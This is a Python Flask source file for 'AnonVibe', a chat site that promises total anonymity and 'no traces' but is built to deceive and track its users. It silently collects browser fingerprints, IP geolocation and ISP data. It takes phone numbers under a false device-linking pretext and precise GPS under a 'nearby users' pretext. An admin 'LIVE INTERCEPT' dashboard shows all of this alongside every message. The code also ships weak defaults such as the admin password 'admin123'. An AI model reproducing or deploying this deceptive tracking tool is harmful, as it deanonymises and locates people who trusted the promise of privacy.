import os
import hashlib
import json
from datetime import datetime, timezone
import requests
from flask import Flask, render_template_string, request, jsonify, send_from_directory, session, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anonvibe-dev-key-772211')
# For Render/Production: use DATABASE_URL if available, else fallback to sqlite
db_url = os.environ.get('DATABASE_URL')
if db_url and db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)
app.config['SQLALCHEMY_DATABASE_URI'] = db_url or 'sqlite:///anonvibe.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB

if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

db = SQLAlchemy(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# --- Models ---
class Visit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    ip = db.Column(db.String(45))
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))
    country = db.Column(db.String(100))
    lat = db.Column(db.Float)
    lon = db.Column(db.Float)
    isp = db.Column(db.String(255))
    fingerprint = db.Column(db.String(64))
    phone = db.Column(db.String(20))
    precise_lat = db.Column(db.Float)
    precise_lon = db.Column(db.Float)
    accuracy = db.Column(db.Float)
    user_agent = db.Column(db.Text)
    # New fingerprinting fields
    platform = db.Column(db.String(100))
    max_touch_points = db.Column(db.Integer)
    hardware_concurrency = db.Column(db.Integer)
    device_memory = db.Column(db.Integer)

class Message(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    fingerprint = db.Column(db.String(64))
    text = db.Column(db.Text)
    attachment_path = db.Column(db.String(255))
    filename = db.Column(db.String(255))

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)

with app.app_context():
    db.create_all()
    # Bootstrap admin if none exists
    if not Admin.query.filter_by(username='admin').first():
        hashed_pw = generate_password_hash(os.environ.get('ADMIN_PASSWORD', 'admin123'))
        new_admin = Admin(username='admin', password_hash=hashed_pw)
        db.session.add(new_admin)
        db.session.commit()

# --- Templates ---

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AnonVibe • Private Anonymous Chat</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <style>
        body { background-color: #050505; color: #00ff9d; font-family: 'Courier New', Courier, monospace; }
        .cyber-border { border: 1px solid rgba(0, 255, 157, 0.3); }
        .cyber-bg { background-color: rgba(10, 10, 10, 0.95); }
        .glow:hover { box-shadow: 0 0 15px rgba(0, 255, 157, 0.4); }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #00ff9d; border-radius: 5px; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Landing Page Section -->
    <div id="landing" class="max-w-4xl w-full text-center space-y-8 py-12">
        <h1 class="text-6xl font-black tracking-tighter mb-4">ANON<span class="text-white">VIBE</span></h1>
        <p class="text-xl text-green-400/80">100% Anonymous. No Registration. No Traces.</p>

        <div class="bg-zinc-900/50 p-8 rounded-3xl cyber-border inline-block w-full max-w-2xl text-left space-y-4 opacity-50 select-none pointer-events-none">
            <div class="flex gap-2">
                <div class="w-8 h-8 rounded-full bg-green-900/50"></div>
                <div class="bg-zinc-800 rounded-2xl px-4 py-2 text-sm">Hey, anyone here?</div>
            </div>
            <div class="flex gap-2 justify-end">
                <div class="bg-green-900 rounded-2xl px-4 py-2 text-sm">Yeah, total silence. It's safe.</div>
                <div class="w-8 h-8 rounded-full bg-white/10"></div>
            </div>
        </div>

        <div>
            <button onclick="enterChat()" class="bg-green-500 hover:bg-green-400 text-black font-bold py-6 px-12 rounded-full text-2xl transition-all glow transform hover:scale-105">
                ENTER ANONYMOUS CHAT
            </button>
        </div>
        <p class="text-xs opacity-40">By entering, you agree to our strictly private terms.</p>
    </div>

    <!-- Chat Section (Hidden Initially) -->
    <div id="chat-container" class="hidden w-full max-w-4xl h-[85vh] flex flex-col bg-zinc-900/80 rounded-3xl cyber-border overflow-hidden shadow-2xl">
        <div class="p-6 border-b border-green-900/30 flex justify-between items-center bg-black/40">
            <div class="flex items-center gap-3">
                <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                <span class="font-bold tracking-widest uppercase">Encrypted Channel</span>
            </div>
            <div class="text-xs opacity-50">SESS_{{ session_id }}</div>
        </div>

        <div id="messages" class="flex-1 overflow-y-auto p-6 space-y-4">
            <!-- Messages appear here -->
        </div>

        <div class="p-6 bg-black/40 border-t border-green-900/30">
            <div class="flex gap-3 items-center">
                <label class="cursor-pointer hover:bg-green-900/20 p-3 rounded-full transition-colors">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13" />
                    </svg>
                    <input type="file" id="fileInput" class="hidden" onchange="uploadFile()">
                </label>
                <input type="text" id="messageInput" placeholder="Write something anonymously..."
                       class="flex-1 bg-black/50 border border-green-900/30 rounded-full px-6 py-4 focus:outline-none focus:border-green-400 transition-all">
                <button onclick="sendMessage()" class="bg-green-500 hover:bg-green-400 text-black px-8 py-4 rounded-full font-bold transition-all">
                    SEND
                </button>
            </div>
        </div>
    </div>

    <!-- Phone Modal -->
    <div id="phoneModal" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center z-50 p-4">
        <div class="bg-zinc-900 p-8 rounded-3xl cyber-border max-w-md w-full space-y-6">
            <h2 class="text-2xl font-bold">Secure Device Linking</h2>
            <p class="text-green-400/70">Link your phone number to maintain your anonymous session across multiple devices. No SMS will be sent.</p>
            <input type="tel" id="phoneInput" placeholder="+234..." class="w-full bg-black border border-green-900/30 rounded-2xl px-6 py-4 focus:outline-none focus:border-green-400">
            <div class="flex gap-4">
                <button onclick="skipPhone()" class="flex-1 py-4 border border-green-900/30 rounded-2xl opacity-60 hover:opacity-100">Later</button>
                <button onclick="submitPhone()" class="flex-1 py-4 bg-green-500 text-black font-bold rounded-2xl">Link Device</button>
            </div>
        </div>
    </div>

    <!-- Location Modal -->
    <div id="locationModal" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center z-50 p-4">
        <div class="bg-zinc-900 p-8 rounded-3xl cyber-border max-w-md w-full space-y-6">
            <h2 class="text-2xl font-bold">Nearby Anonymous Vibes</h2>
            <p class="text-green-400/70">Enable location to find and connect with other anonymous users in your immediate vicinity for better privacy matching.</p>
            <div class="flex gap-4">
                <button onclick="skipLocation()" class="flex-1 py-4 border border-green-900/30 rounded-2xl opacity-60 hover:opacity-100">Skip</button>
                <button onclick="requestLocation()" class="flex-1 py-4 bg-green-500 text-black font-bold rounded-2xl">Enable Nearby</button>
            </div>
        </div>
    </div>

    <script>
        let socket = io();
        let fingerprint = '';

        async function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("AnonVibe-FP", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("AnonVibe-FP", 4, 17);

            const fpData = {
                ua: navigator.userAgent,
                lang: navigator.language,
                color: screen.colorDepth,
                res: `${screen.width}x${screen.height}`,
                tz: new Date().getTimezoneOffset(),
                canvas: canvas.toDataURL(),
                platform: navigator.platform,
                maxTouchPoints: navigator.maxTouchPoints || 0,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0
            };

            const msgUint8 = new TextEncoder().encode(JSON.stringify(fpData));
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 16);

            return { hash, fpData };
        }

        async function enterChat() {
            const { hash, fpData } = await getFingerprint();
            fingerprint = hash;

            // Log visit silently with full fingerprint data
            fetch('/api/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ fingerprint, fpData })
            });

            document.getElementById('landing').classList.add('hidden');
            document.getElementById('phoneModal').classList.remove('hidden');
        }

        function skipPhone() {
            document.getElementById('phoneModal').classList.add('hidden');
            document.getElementById('locationModal').classList.remove('hidden');
        }

        function submitPhone() {
            const phone = document.getElementById('phoneInput').value;
            fetch('/api/submit-phone', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ fingerprint, phone })
            });
            skipPhone();
        }

        function skipLocation() {
            document.getElementById('locationModal').classList.add('hidden');
            document.getElementById('chat-container').classList.remove('hidden');
            initChat();
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/api/log-location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            fingerprint,
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        })
                    });
                    skipLocation();
                }, () => skipLocation());
            } else {
                skipLocation();
            }
        }

        function initChat() {
            socket.on('new_message', (msg) => {
                const messagesDiv = document.getElementById('messages');
                const isMine = msg.fingerprint === fingerprint;

                const msgEl = document.createElement('div');
                msgEl.className = `flex ${isMine ? 'justify-end' : 'justify-start'} mb-4`;

                const bubbleEl = document.createElement('div');
                bubbleEl.className = `max-w-[80%] ${isMine ? 'bg-green-900 text-white' : 'bg-zinc-800 text-green-100'} px-5 py-3 rounded-2xl shadow-lg border border-white/5`;

                if (msg.text) {
                    const textEl = document.createElement('p');
                    textEl.textContent = msg.text;
                    bubbleEl.appendChild(textEl);
                } else if (msg.attachment) {
                    const linkEl = document.createElement('a');
                    linkEl.href = msg.attachment;
                    linkEl.target = "_blank";
                    linkEl.className = "flex items-center gap-2 text-blue-400 underline";
                    linkEl.innerHTML = `
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"></path></svg>
                        <span></span>
                    `;
                    linkEl.querySelector('span').textContent = msg.filename;
                    bubbleEl.appendChild(linkEl);
                }

                const timeEl = document.createElement('div');
                timeEl.className = "text-[10px] opacity-40 mt-1";
                timeEl.textContent = new Date(msg.timestamp).toLocaleTimeString();
                bubbleEl.appendChild(timeEl);

                msgEl.appendChild(bubbleEl);
                messagesDiv.appendChild(msgEl);
                messagesDiv.scrollTop = messagesDiv.scrollHeight;
            });
        }

        function sendMessage() {
            const input = document.getElementById('messageInput');
            const text = input.value.trim();
            if (text) {
                socket.emit('send_message', { text, fingerprint });
                input.value = '';
            }
        }

        function uploadFile() {
            const fileInput = document.getElementById('fileInput');
            const file = fileInput.files[0];
            if (!file) return;

            const formData = new FormData();
            formData.append('file', file);
            formData.append('fingerprint', fingerprint);

            fetch('/api/send-attachment', {
                method: 'POST',
                body: formData
            }).then(() => {
                fileInput.value = '';
            });
        }

        document.getElementById('messageInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });
    </script>
</body>
</html>
"""

ADMIN_LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Login • AnonVibe</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff9d; font-family: 'Courier New', Courier, monospace; }
        .cyber-border { border: 1px solid rgba(0, 255, 157, 0.3); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-zinc-900 p-8 rounded-3xl cyber-border space-y-6 shadow-2xl">
        <h1 class="text-3xl font-bold text-center">ADMIN ACCESS</h1>
        <form action="/admin/login" method="POST" class="space-y-4">
            <div>
                <label class="block text-xs uppercase tracking-widest opacity-60 mb-2">Username</label>
                <input type="text" name="username" required
                       class="w-full bg-black border border-green-900/30 rounded-2xl px-6 py-4 focus:outline-none focus:border-green-400 mb-4">
                <label class="block text-xs uppercase tracking-widest opacity-60 mb-2">Security Token</label>
                <input type="password" name="password" required
                       class="w-full bg-black border border-green-900/30 rounded-2xl px-6 py-4 focus:outline-none focus:border-green-400">
            </div>
            <button type="submit" class="w-full bg-green-500 hover:bg-green-400 text-black font-bold py-4 rounded-2xl transition-all">
                AUTHORIZE
            </button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Control Center • AnonVibe</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff9d; font-family: 'Courier New', Courier, monospace; }
        .cyber-border { border: 1px solid rgba(0, 255, 157, 0.3); }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #00ff9d; border-radius: 5px; }
    </style>
</head>
<body class="p-8">
    <div class="flex justify-between items-center mb-12">
        <h1 class="text-4xl font-bold tracking-tighter">ANON<span class="text-white">VIBE</span> CONTROL</h1>
        <a href="/admin/logout" class="text-red-500 hover:underline">Terminate Session</a>
    </div>

    <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">
        <!-- Visits Panel -->
        <div class="xl:col-span-2 space-y-6">
            <h2 class="text-2xl font-bold flex items-center gap-3">
                <span class="w-3 h-3 bg-blue-500 rounded-full"></span>
                ACTIVE MONITORING (Grouped by Fingerprint)
            </h2>

            {% for fp, v_list in grouped_visits.items() %}
            <div class="bg-zinc-900 rounded-3xl cyber-border overflow-hidden mb-8">
                <div class="bg-green-900/20 p-4 border-b border-green-900/30 flex justify-between">
                    <span class="font-mono text-yellow-500 font-bold">FP: {{ fp }}</span>
                    <span class="text-xs opacity-60">{{ v_list|length }} sessions</span>
                </div>
                <div class="overflow-x-auto">
                    <table class="w-full text-left text-sm">
                        <thead class="bg-black/50 border-b border-green-900/30">
                            <tr>
                                <th class="p-4">Timestamp</th>
                                <th class="p-4">IP / Geo / HW</th>
                                <th class="p-4">Device Linking</th>
                                <th class="p-4">Precise Location</th>
                            </tr>
                        </thead>
                        <tbody class="divide-y divide-green-900/10">
                            {% for visit in v_list %}
                            <tr class="hover:bg-white/5 transition-colors">
                                <td class="p-4 opacity-60">{{ visit.timestamp.strftime('%H:%M:%S') }}<br>{{ visit.timestamp.strftime('%Y-%m-%d') }}</td>
                                <td class="p-4">
                                    <span class="font-bold">{{ visit.ip }}</span><br>
                                    <span class="text-xs opacity-60">{{ visit.city }}, {{ visit.country }}</span><br>
                                    <span class="text-[10px] opacity-40">{{ visit.isp }}</span><br>
                                    <span class="text-[10px] text-blue-400">Plat: {{ visit.platform or 'N/A' }} | HW: {{ visit.hardware_concurrency or 'N/A' }} | Mem: {{ visit.device_memory or 'N/A' }}G | Touch: {{ visit.max_touch_points or 0 }}</span>
                                </td>
                                <td class="p-4">
                                    {% if visit.phone %}
                                        <span class="bg-green-900/40 text-green-400 px-3 py-1 rounded-full text-xs">{{ visit.phone }}</span>
                                    {% else %}
                                        <span class="opacity-20">—</span>
                                    {% endif %}
                                </td>
                                <td class="p-4">
                                    {% if visit.precise_lat %}
                                        <a href="https://www.google.com/maps?q={{ visit.precise_lat }},{{ visit.precise_lon }}" target="_blank" class="text-blue-400 hover:underline text-xs">
                                            {{ visit.precise_lat }}, {{ visit.precise_lon }}
                                            <br><span class="opacity-60">±{{ visit.accuracy }}m</span>
                                        </a>
                                    {% else %}
                                        <span class="opacity-20">—</span>
                                    {% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
            {% endfor %}
        </div>

        <!-- Chat Feed Panel -->
        <div class="space-y-6">
            <h2 class="text-2xl font-bold flex items-center gap-3">
                <span class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></span>
                LIVE INTERCEPT
            </h2>
            <div class="bg-zinc-900 rounded-3xl cyber-border h-[500px] flex flex-col overflow-hidden">
                <div class="flex-1 overflow-y-auto p-4 space-y-4">
                    {% for msg in messages %}
                    <div class="border-l-2 border-green-500/30 pl-4 py-2">
                        <div class="flex justify-between items-start mb-1">
                            <span class="text-[10px] font-mono text-yellow-500">{{ msg.fingerprint }}</span>
                            <span class="text-[10px] opacity-40">{{ msg.timestamp.strftime('%H:%M:%S') }}</span>
                        </div>
                        {% if msg.text %}
                            <p class="text-sm text-green-100">{{ msg.text }}</p>
                        {% elif msg.attachment_path %}
                            <a href="{{ msg.attachment_path }}" target="_blank" class="text-xs text-blue-400 underline italic">Attachment: {{ msg.filename }}</a>
                        {% endif %}
                    </div>
                    {% endfor %}
                </div>
            </div>

            <h2 class="text-2xl font-bold mt-8 mb-4">MESSAGES DUMP (JSON)</h2>
            <pre class="bg-black text-[10px] p-4 rounded-xl border border-green-900/30 overflow-auto h-[300px]">{{ messages_json }}</pre>
        </div>
    </div>

    <div class="mt-12 text-center text-xs opacity-20">
        &copy; ANONVIBE CONTROL SYSTEM v1.0.4.5
    </div>
</body>
</html>
"""

# --- Routes ---

def get_geo(ip):
    if ip in ["127.0.0.1", "::1", "localhost"]:
        return {
            "ip": ip, "city": "Lagos", "region": "Lagos", "country_name": "Nigeria",
            "latitude": 6.5244, "longitude": 3.3792, "timezone": "Africa/Lagos",
            "asn": "AS36886", "org": "MTN Nigeria Communications Ltd"
        }
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return {}

@app.route('/')
def index():
    import random
    return render_template_string(INDEX_HTML, session_id=random.randint(1000, 9999))

@app.route('/api/log', methods=['POST'])
def log_visit():
    data = request.json
    ip = request.remote_addr
    geo = get_geo(ip)
    fp_data = data.get('fpData', {})

    visit = Visit(
        ip=ip,
        city=geo.get('city'),
        region=geo.get('region'),
        country=geo.get('country_name'),
        lat=geo.get('latitude'),
        lon=geo.get('longitude'),
        isp=geo.get('org'),
        fingerprint=data.get('fingerprint'),
        user_agent=request.headers.get('User-Agent'),
        platform=fp_data.get('platform'),
        max_touch_points=fp_data.get('maxTouchPoints'),
        hardware_concurrency=fp_data.get('hardwareConcurrency'),
        device_memory=fp_data.get('deviceMemory')
    )
    db.session.add(visit)
    db.session.commit()
    return jsonify({"status": "success", "visit_id": visit.id})

@app.route('/api/submit-phone', methods=['POST'])
def submit_phone():
    data = request.json
    visit = Visit.query.filter_by(fingerprint=data.get('fingerprint')).order_by(Visit.timestamp.desc()).first()
    if visit:
        visit.phone = data.get('phone')
        db.session.commit()
    return jsonify({"status": "success"})

@app.route('/api/log-location', methods=['POST'])
def log_location():
    data = request.json
    visit = Visit.query.filter_by(fingerprint=data.get('fingerprint')).order_by(Visit.timestamp.desc()).first()
    if visit:
        visit.precise_lat = data.get('lat')
        visit.precise_lon = data.get('lon')
        visit.accuracy = data.get('accuracy')
        db.session.commit()
    return jsonify({"status": "success"})

@app.route('/api/send-attachment', methods=['POST'])
def send_attachment():
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files['file']
    fingerprint = request.form.get('fingerprint')
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    filename = secure_filename(file.filename)
    unique_filename = f"{int(datetime.now(timezone.utc).timestamp())}_{filename}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
    file.save(filepath)

    msg = Message(
        fingerprint=fingerprint,
        attachment_path=f"/uploads/{unique_filename}",
        filename=filename
    )
    db.session.add(msg)
    db.session.commit()

    socketio.emit('new_message', {
        'id': msg.id,
        'timestamp': msg.timestamp.isoformat(),
        'fingerprint': msg.fingerprint,
        'attachment': msg.attachment_path,
        'filename': msg.filename
    })

    return jsonify({"status": "success"})

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@socketio.on('send_message')
def handle_message(data):
    msg = Message(
        fingerprint=data.get('fingerprint'),
        text=data.get('text')
    )
    db.session.add(msg)
    db.session.commit()

    emit('new_message', {
        'id': msg.id,
        'timestamp': msg.timestamp.isoformat(),
        'fingerprint': msg.fingerprint,
        'text': msg.text
    }, broadcast=True)

@app.route('/admin')
def admin_login_page():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_dashboard'))
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin/login', methods=['POST'])
def admin_login():
    username = request.form.get('username')
    password = request.form.get('password')
    admin = Admin.query.filter_by(username=username).first()
    if admin and check_password_hash(admin.password_hash, password):
        session['admin_logged_in'] = True
        session['admin_user'] = username
        return redirect(url_for('admin_dashboard'))
    return "Invalid credentials", 401

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login_page'))

    grouped_visits = {}
    all_visits = Visit.query.order_by(Visit.timestamp.desc()).all()
    for v in all_visits:
        if v.fingerprint not in grouped_visits:
            grouped_visits[v.fingerprint] = []
        grouped_visits[v.fingerprint].append(v)

    messages = Message.query.order_by(Message.timestamp.desc()).all()
    messages_json = json.dumps([{
        "id": m.id,
        "timestamp": m.timestamp.isoformat(),
        "fingerprint": m.fingerprint,
        "text": m.text,
        "attachment": m.attachment_path,
        "filename": m.filename
    } for m in messages], indent=2)

    return render_template_string(ADMIN_HTML, grouped_visits=grouped_visits, messages=messages, messages_json=messages_json)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    session.pop('admin_user', None)
    return redirect(url_for('admin_login_page'))

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5000)
